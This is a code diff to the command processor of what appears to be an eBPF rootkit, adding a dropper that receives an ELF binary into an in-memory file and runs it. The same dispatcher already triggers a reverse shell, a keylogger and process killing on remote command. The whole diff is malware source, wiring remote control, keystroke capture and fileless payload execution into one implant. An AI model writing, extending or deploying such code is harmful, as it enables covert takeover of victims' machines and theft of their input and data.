@@ -12,6 +12,7 @@
 #include "userspace/command_processor.h"
 #include "userspace/loader.h"
 #include "userspace/reverse_shell.h"
+#include "userspace/dropper.h"
 
 /**
  * @brief Kill all tracked PIDs from eBPF map
@@ -100,8 +101,12 @@ static void uninstall(command_processor_context_t *command_processor_ctx) {
  * @return int
  */
 static int spawn_reverse_shell(command_processor_context_t *command_processor_ctx) {
+
     if (!command_processor_ctx)
         return -EINVAL;
+
+    if (*(command_processor_ctx->reverse_shell_pid) != -1)
+        return -EBUSY;
 
     int ret = 0;
 
@@ -125,6 +130,23 @@ static int spawn_reverse_shell(command_processor_context_t *command_processor_ct
     return ret;
 }
 
+static int receive_elf_from_dropper(command_processor_context_t *command_processor_ctx) {
+    if (!command_processor_ctx)
+        return -EINVAL;
+
+    command_processor_ctx->dropper_ctx.memory_file_fd = -1;
+    command_processor_ctx->dropper_ctx.memory_file_name = "drop";
+
+    return dropper_receive(&command_processor_ctx->dropper_ctx);
+}
+
+static int run_elf_from_dropper(command_processor_context_t *command_processor_ctx) {
+    if (!command_processor_ctx)
+        return -EINVAL;
+
+    return dropper_run(&command_processor_ctx->dropper_ctx);
+}
+
 int command_processor_handle_received_command(void *ctx, void *data, size_t data_sz) {
     (void)ctx;
     (void)data_sz;
@@ -132,30 +154,39 @@ int command_processor_handle_received_command(void *ctx, void *data, size_t data
     if (!ctx || !data)
         return -EINVAL;
 
+    int res = 0;
+
     command_processor_context_t *command_processor_ctx = (command_processor_context_t *)ctx;
 
     event_t *event = (event_t *)data;
 
     switch (event->command_opcode) {
     case COMMAND_REVERSE_SHELL_START:
-        if (*(command_processor_ctx->reverse_shell_pid) == -1)
-            spawn_reverse_shell(command_processor_ctx);
+        res = spawn_reverse_shell(command_processor_ctx);
         break;
     case COMMAND_REVERSE_SHELL_STOP:
         remove_reverse_shell(command_processor_ctx);
         break;
     case COMMAND_KEYLOGGER_START:
-        keylogger_start(command_processor_ctx);
+        res = keylogger_start(command_processor_ctx);
         break;
     case COMMAND_KEYLOGGER_STOP:
-        keylogger_stop(command_processor_ctx);
+        res = keylogger_stop(command_processor_ctx);
         break;
     case COMMAND_UNINSTALL:;
         uninstall(command_processor_ctx);
         break;
+    case COMMAND_DROPPER:
+        res = receive_elf_from_dropper(command_processor_ctx);
+        if (res)
+            break;
+
+        res = run_elf_from_dropper(command_processor_ctx);
+        break;
     default:
+        res = -ENOTSUP;
         break;
     }
 
-    return 0;
+    return res;
 }
